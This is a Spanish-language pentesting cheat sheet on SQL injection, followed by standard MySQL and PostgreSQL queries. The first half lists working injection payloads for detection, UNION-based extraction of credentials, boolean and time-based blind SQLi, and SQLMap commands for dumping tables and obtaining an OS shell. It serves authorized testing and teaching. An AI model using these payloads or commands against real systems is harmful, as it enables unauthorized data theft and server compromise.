---
title: "SQL Injection y Consultas de Base de Datos: Referencia para Pentesters"
description: "Payloads de SQL injection, ataques UNION, técnicas de blind SQLi y consultas estándar para MySQL y PostgreSQL. Una referencia táctica para pentesters y administradores de bases de datos."
date: 2026-02-10
tags: ["sql-injection", "cheatsheet", "penetration-testing", "database", "security"]
keywords: ["payloads sql injection", "cheatsheet comandos mysql", "cheat sheet postgresql", "hacking de bases de datos", "comandos sqlmap", "union sql injection", "blind sql injection", "pruebas sql injection", "enumeración de bases de datos", "prevención sql injection"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "SQL Injection y Consultas de Base de Datos: Referencia para Pentesters",
    "description": "Payloads de SQL injection, ataques UNION, blind SQLi y consultas para MySQL y PostgreSQL.",
    "proficiencyLevel": "Intermediate",
    "inLanguage": "es"
  }
---

## Inicio del Sistema

La SQL injection sigue siendo una de las vulnerabilidades más críticas en aplicaciones web — consistentemente clasificada en el OWASP Top 10. Ocurre cuando la entrada del usuario se concatena directamente en consultas SQL sin la sanitización adecuada, permitiendo a un atacante manipular la lógica de la consulta a la base de datos. Una SQL injection exitosa puede conducir a la exfiltración completa de datos, elusión de autenticación, escalación de privilegios y, en algunos casos, ejecución remota de comandos en el servidor de la base de datos. Este manual de campo proporciona tanto los payloads ofensivos para pruebas de penetración autorizadas como las consultas SQL estándar que todo administrador de bases de datos necesita conocer.

Todas las técnicas de injection son exclusivamente para pruebas autorizadas. El acceso no autorizado es ilegal.

---

## Detección de SQLi

Antes de explotar una vulnerabilidad de SQL injection, necesitas confirmar que existe. La detección implica enviar entradas especialmente diseñadas a los parámetros de la aplicación y observar la respuesta en busca de mensajes de error, cambios de comportamiento o diferencias de tiempo. Estas sondas iniciales te indican si el parámetro es inyectable y qué tipo de injection es posible.

### Payloads de detección básicos

```sql
-- Single quote test (triggers syntax error if vulnerable)
'

-- Double quote test
"

-- Comment-based detection
' OR 1=1--
' OR 1=1#
' OR 1=1/*

-- Numeric injection test (always true vs always false)
1 OR 1=1
1 AND 1=2

-- String-based detection
' OR 'a'='a
' OR 'a'='a'--

-- Error-based detection (force a type conversion error)
' AND 1=CONVERT(int,(SELECT @@version))--

-- Time-based detection (if the response is delayed, injection exists)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### Identificar el backend de la base de datos

```sql
-- MySQL
' UNION SELECT @@version--

-- PostgreSQL
' UNION SELECT version()--

-- MSSQL
' UNION SELECT @@version--

-- Oracle
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--

-- SQLite
' UNION SELECT sqlite_version()--
```

---

## Ataques UNION

La SQL injection basada en UNION es la técnica más poderosa cuando los mensajes de error o los resultados de las consultas se muestran en la página. Funciona añadiendo una sentencia `UNION SELECT` a la consulta original, permitiéndote extraer datos de cualquier tabla de la base de datos. El requisito clave es determinar el número correcto de columnas en la consulta original para que la sentencia UNION coincida.

### Determinar el número de columnas

```sql
-- Using ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- (error at N means there are N-1 columns)

-- Using UNION SELECT with NULL placeholders
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- (no error means correct column count)
```

### Extraer datos

```sql
-- Find which columns are displayed on the page
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Extract database version
' UNION SELECT NULL,@@version,NULL--

-- Extract current database name
' UNION SELECT NULL,database(),NULL--           -- MySQL
' UNION SELECT NULL,current_database(),NULL--   -- PostgreSQL

-- Extract current user
' UNION SELECT NULL,user(),NULL--               -- MySQL
' UNION SELECT NULL,current_user,NULL--         -- PostgreSQL

-- List all databases (MySQL)
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- List all tables in a database (MySQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--

-- List columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract usernames and passwords
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

---

## Blind SQL Injection

Cuando la aplicación no muestra los resultados de las consultas ni los mensajes de error en la página, se trata de blind SQL injection. La vulnerabilidad sigue existiendo, pero la extracción de datos requiere inferencia — ya sea a través de condiciones booleanas (¿cambia la página?) o retrasos de tiempo (¿la respuesta tarda más?). La blind SQLi es más lenta pero igualmente peligrosa.

### Blind basada en booleanos

```sql
-- Test if the first character of the database name is 'm'
' AND SUBSTRING(database(),1,1)='m'--

-- Test using ASCII values
' AND ASCII(SUBSTRING(database(),1,1))>100--

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'--

-- Binary search approach (faster than linear)
' AND ASCII(SUBSTRING(database(),1,1))>64--    -- Is it > '@'?
' AND ASCII(SUBSTRING(database(),1,1))>96--    -- Is it > '`'?
' AND ASCII(SUBSTRING(database(),1,1))>112--   -- Is it > 'p'?
```

### Blind basada en tiempo

```sql
-- MySQL: if condition is true, response is delayed by 5 seconds
' AND IF(1=1, SLEEP(5), 0)--

-- Extract data using time delays
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- PostgreSQL time-based
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL time-based
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

---

## Automatización con SQLMap

SQLMap es la herramienta estándar de la industria para la detección y explotación automatizada de SQL injection. Gestiona detección, fingerprinting, extracción de datos e incluso acceso a nivel de sistema operativo a través de SQL injection — todo desde la línea de comandos. Para pruebas de penetración autorizadas, acelera drásticamente la fase de explotación.

```bash
# Basic scan of a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Specify the parameter to test
sqlmap -u "http://target.com/page?id=1" -p id

# Test POST request parameters
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Use a specific technique (B=Boolean, T=Time, U=Union, E=Error)
sqlmap -u "http://target.com/page?id=1" --technique=BU

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump a specific table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C username,password --dump

# Use cookies for authenticated scanning
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Increase verbosity and use threads
sqlmap -u "http://target.com/page?id=1" -v 3 --threads=5

# Try to get an OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## Consultas SQL Estándar

Más allá de las pruebas de injection, todo profesional de seguridad y desarrollador necesita conocer SQL estándar para la administración de bases de datos, análisis de logs y extracción de datos durante investigaciones. Estas consultas funcionan tanto en MySQL como en PostgreSQL y cubren las operaciones de base de datos más comunes.

### Consultas SELECT

```sql
-- Select all records
SELECT * FROM users;

-- Select specific columns
SELECT username, email FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE role = 'admin';

-- Pattern matching
SELECT * FROM users WHERE email LIKE '%@example.com';

-- Order results
SELECT * FROM users ORDER BY created_at DESC;

-- Limit results
SELECT * FROM users LIMIT 10;
SELECT * FROM users LIMIT 10 OFFSET 20;

-- Count records
SELECT COUNT(*) FROM users WHERE active = true;

-- Distinct values
SELECT DISTINCT role FROM users;
```

### Consultas JOIN

```sql
-- Inner join (only matching records)
SELECT u.username, o.order_id, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- Left join (all users, even without orders)
SELECT u.username, o.order_id
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- Multiple joins
SELECT u.username, o.order_id, p.product_name
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id;
```

### INSERT, UPDATE, DELETE

```sql
-- Insert a new record
INSERT INTO users (username, email, role)
VALUES ('newuser', 'user@example.com', 'user');

-- Update a record
UPDATE users SET role = 'admin' WHERE username = 'newuser';

-- Delete a record
DELETE FROM users WHERE username = 'olduser';

-- Delete all records (use with caution)
DELETE FROM users;
TRUNCATE TABLE users;
```

### Administración de la base de datos

```sql
-- Create a database
CREATE DATABASE myapp;

-- Create a table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Add an index
CREATE INDEX idx_users_email ON users(email);

-- Grant privileges (MySQL)
GRANT ALL PRIVILEGES ON myapp.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;

-- Grant privileges (PostgreSQL)
GRANT ALL PRIVILEGES ON DATABASE myapp TO appuser;
```
